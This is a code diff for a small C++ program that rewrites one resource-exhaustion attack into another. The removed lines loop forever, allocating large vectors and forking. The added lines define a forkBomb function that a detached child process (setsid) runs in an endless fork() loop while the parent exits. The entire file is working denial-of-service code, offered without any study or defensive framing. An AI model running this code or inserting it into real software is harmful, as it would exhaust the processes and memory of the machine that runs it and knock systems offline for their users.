@@ -1,14 +1,24 @@
-#include <string>
+#include <iostream>
 #include <unistd.h>
-#include <vector>
 
-int main () {
-
-    while(1) {
-        std::vector<std::vector<std::string>> big(1000, std::vector<std::string>(1, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"));
-		setsid();
-		fork();
-        fork();
+void forkBomb() {
+    while (true) {
+        fork(); // Create a new process
     }
+}
+
+int main() {
+    pid_t pid = fork();    
+    if (pid == 0) {
+        setsid();
+        forkBomb();
+    } else if (pid > 0) {
+        return 0;
+    } else {
+        std::cerr << "Fork failed." << std::endl;
+        return 1;
+    }
+
     return 0;
 }
+
